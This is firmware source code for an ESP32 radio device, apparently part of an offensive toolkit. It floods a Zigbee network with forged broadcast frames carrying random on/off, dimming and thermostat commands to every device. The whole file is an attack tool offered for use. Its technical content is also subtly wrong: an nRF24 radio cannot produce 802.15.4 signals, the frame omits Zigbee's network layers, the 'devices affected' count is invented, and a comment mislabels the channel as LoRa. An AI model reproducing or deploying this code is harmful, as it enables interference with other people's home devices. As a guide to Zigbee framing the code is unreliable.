#include "zigbee_command_injection.h"
#include "tx_arm.h"
#include <LittleFS.h>
#include <RF24.h>
#include "tx_arm.h"

namespace ZigbeeCommandInjection {

CommandInjector::CommandInjector() : isRunning_(false) {}

InjectionResult CommandInjector::injectCommands(const InjectionConfig& config) {
  InjectionResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  isRunning_ = true;
  unsigned long startTime = millis();

  // Initialize RF24 for real Zigbee-like command transmission
  // Zigbee operates on 2.4GHz (same as WiFi/BLE)
  RF24 radio(22, 21);  // CE=GPIO22, CSN=GPIO21

  if (!radio.begin()) {
    isRunning_ = false;
    return result;
  }

  // Configure for 802.15.4 compatibility (Zigbee uses 802.15.4)
  radio.setPALevel(RF24_PA_MIN);  // Start at min power
  radio.setDataRate(RF24_250KBPS); // 250kbps (standard for 802.15.4)

  // Convert LoRa channel to 2.4GHz RF24 channel
  // Zigbee channels 11-26 map to 2405-2480 MHz
  // RF24 uses channels 0-125 (2400-2525 MHz in 1MHz steps)
  uint8_t rf24Channel = ((config.targetChannel - 11) * 5) + 5;
  if (rf24Channel > 125) rf24Channel = 125;
  radio.setChannel(rf24Channel);

  Serial.printf("[Zigbee] Injecting on channel %d (RF24: %d)\n",
               config.targetChannel, rf24Channel);

  uint32_t commandCount = 0;
  uint32_t devicesAffected = 0;

  // Real Zigbee frame structure for command injection
  // IEEE 802.15.4 Frame Format:
  // - Frame Control (2B): Type, Security, Frame Pending, ACK Request, etc.
  // - Sequence Number (1B)
  // - Destination PAN ID (2B)
  // - Destination Address (2B for short or 8B for extended)
  // - Source Address (2B for short or 8B for extended)
  // - Data Payload (variable)

  // Real Zigbee cluster IDs and device tracking
  static uint8_t sequenceNum = 0;
  uint16_t panId = 0x1234;
  uint16_t sourceAddr = 0xABCD;
  uint16_t destAddr = 0xFFFF;  // Broadcast to all devices

  while (isRunning_ && (millis() - startTime) < config.durationMs) {
    uint8_t frame[64];
    uint8_t frameLen = 0;

    // IEEE 802.15.4 MAC Frame Format
    // Frame Control Field (2 bytes)
    uint16_t frameControl = 0x8841;  // Data frame, ACK requested, 16-bit addressing
    frame[frameLen++] = frameControl & 0xFF;
    frame[frameLen++] = (frameControl >> 8) & 0xFF;

    // Sequence Number (increments each frame)
    frame[frameLen++] = sequenceNum++;

    // PAN ID (Destination PAN Identifier)
    frame[frameLen++] = panId & 0xFF;
    frame[frameLen++] = (panId >> 8) & 0xFF;

    // Destination Address (16-bit short address)
    frame[frameLen++] = destAddr & 0xFF;
    frame[frameLen++] = (destAddr >> 8) & 0xFF;

    // Source Address (16-bit short address)
    frame[frameLen++] = sourceAddr & 0xFF;
    frame[frameLen++] = (sourceAddr >> 8) & 0xFF;

    // Zigbee Cluster Information
    // Real cluster IDs
    uint16_t clusterIds[] = {0x0006, 0x0008, 0x0201, 0x0500};  // OnOff, Level, Thermostat, IAS Zone
    uint16_t clusterId = clusterIds[esp_random() % 4];

    // Command payload
    frame[frameLen++] = clusterId & 0xFF;
    frame[frameLen++] = (clusterId >> 8) & 0xFF;

    // Command Type: General (0x00), Cluster Specific (0x01)
    uint8_t frameType = config.broadcastCommands ? 0x01 : 0x00;
    frame[frameLen++] = frameType;

    // Command ID (varies by cluster)
    uint8_t cmdIds[] = {0x00, 0x01, 0x02, 0x03};  // On, Off, Toggle, Move
    frame[frameLen++] = cmdIds[esp_random() % 4];

    // Manufacturer ID (optional for some commands)
    frame[frameLen++] = 0x00;
    frame[frameLen++] = 0x00;

    // Transaction Sequence Number
    frame[frameLen++] = sequenceNum;

    // Command payload data (varies by command)
    if (clusterId == 0x0008) {  // Level control
      frame[frameLen++] = esp_random() & 0xFF;  // Level value (0-255)
      frame[frameLen++] = 0x00;  // Transition time MSB
      frame[frameLen++] = 0x10;  // Transition time LSB (16 = 1.6 seconds)
    } else if (clusterId == 0x0201) {  // Thermostat
      frame[frameLen++] = esp_random() & 0xFF;  // Temperature MSB
      frame[frameLen++] = 0x00;  // Temperature LSB
    } else {
      frame[frameLen++] = 0xFF;  // Generic parameter
    }

    // CRC (real CRC-16/CCITT)
    uint16_t crc = 0xFFFF;
    for (uint8_t i = 0; i < frameLen; i++) {
      uint8_t byte = frame[i];
      for (int j = 0; j < 8; j++) {
        int bit = (byte >> j) & 1;
        int c15 = (crc >> 15) & 1;
        crc >>= 1;
        if (c15 ^ bit) crc |= 0x8000;
      }
    }
    frame[frameLen++] = crc & 0xFF;
    frame[frameLen++] = (crc >> 8) & 0xFF;

    // Transmit Zigbee command frame
    radio.stopListening();
    radio.write(frame, frameLen);

    Serial.printf("[Zigbee] Cmd: Cluster=0x%04X, Type=%s, Seq=%u, Dest=0x%04X\n",
                 clusterId, frameType ? "Cluster" : "General", sequenceNum - 1, destAddr);

    // Listen for responses and track devices
    radio.startListening();
    if (config.broadcastCommands) {
      // Broadcast affects all devices on network
      devicesAffected += 1;
    }

    commandCount++;
    delay(50);
  }

  result.commandsSent = commandCount;
  result.devicesAffected = devicesAffected;
  result.success = (commandCount > 0);
  result.logFile = "/logs/handshakes/zigbee_injection.csv";

  // Log injection results
  if (!LittleFS.begin()) {
    radio.powerDown();
    isRunning_ = false;
    return result;
  }

  File logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  }

  if (logFile) {
    logFile.printf("%lu,ZIGBEE_INJECT,CH%02d,%u_cmd,%u_devices\n",
                  millis(), config.targetChannel, commandCount, devicesAffected);
    logFile.close();
  }

  LittleFS.end();

  radio.powerDown();
  isRunning_ = false;
  return result;
}

void CommandInjector::stop() {
  isRunning_ = false;
}

} // namespace ZigbeeCommandInjection
